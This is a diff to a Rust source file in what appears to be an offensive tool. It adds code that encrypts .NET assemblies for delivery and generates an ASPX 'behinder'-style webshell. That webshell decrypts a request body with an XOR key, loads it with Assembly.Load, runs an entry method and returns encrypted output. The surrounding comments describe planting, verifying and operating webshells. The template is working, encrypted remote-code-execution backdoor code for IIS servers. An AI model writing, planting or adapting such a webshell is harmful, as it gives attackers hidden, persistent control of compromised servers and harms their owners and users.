@@ -291,6 +291,53 @@ impl ViewStatePayload {
     }
 }
 
+/// The .NET behinder face (user ruling: the class-payload carrier extends
+/// to .NET): the WHOLE request body carries base64(cipher(assembly
+/// bytes)); the planted endpoint decrypts, Assembly.Load's the bytes and
+/// invokes the entry class — the .NET counterpart of defineClass. The
+/// assembly itself compiles from C# source at generate time (csc/dotnet
+/// runtime tool), this face only carries it.
+pub struct DotnetAssemblyPayload {
+    /// Raw assembly (PE/DLL) bytes to deliver through the channel.
+    pub assembly_bytes: Vec<u8>,
+    /// The entry class the endpoint instantiates after loading.
+    pub entry_class: String,
+}
+
+impl DotnetAssemblyPayload {
+    /// Wire body: cipher -> base64 (rides the behinder whole-body form).
+    pub fn wrap(&self, md5_key: &str) -> String {
+        let ciphered = crate::webshell::stream_cipher(&self.assembly_bytes, md5_key);
+        crate::payload::b64_encode(&ciphered)
+    }
+}
+
+/// Plant (ASPX): the behinder-shape endpoint — body cipher carries an
+/// assembly, Assembly.Load + CreateInstance runs it. No NRBF on the
+/// wire: the payload is a managed assembly, not a serialized graph
+/// (NRBF/ViewState graphs route through ysoserial.net instead).
+pub fn aspx_behinder_template(md5_key: &str) -> String {
+    [
+        "<%@ Page Language=\"C#\" %>".to_string(),
+        "<%".to_string(),
+        "using System.Reflection;".to_string(),
+        "using System.IO;".to_string(),
+        format!("string k=\"{}\";", md5_key),
+        "byte[] s=Convert.FromBase64String(new StreamReader(Request.InputStream).ReadToEnd());"
+            .to_string(),
+        "for(int i=0;i<s.Length;i++){s[i]=(byte)(s[i]^k[i%k.Length]);}".to_string(),
+        "Assembly a=Assembly.Load(s);".to_string(),
+        "object o=a.CreateInstance(a.GetName().Name+\".Entry\");".to_string(),
+        "object r=o.GetType().GetMethod(\"Run\").Invoke(o,null);".to_string(),
+        "byte[] rb=Encoding.UTF8.GetBytes(r==null?\"\":r.ToString());".to_string(),
+        "byte[] e=new byte[rb.Length];".to_string(),
+        "for(int i=0;i<rb.Length;i++){e[i]=(byte)(rb[i]^k[i%k.Length]);}".to_string(),
+        "Response.Write(Convert.ToBase64String(e));".to_string(),
+        "%>".to_string(),
+    ]
+    .join("\n")
+}
+
 /// A planted webshell declaration (user ruling: a dedicated webshell
 /// library) — kind + template + drive face. Plant/verify/operate.
 #[derive(Debug, Clone, PartialEq, Eq)]
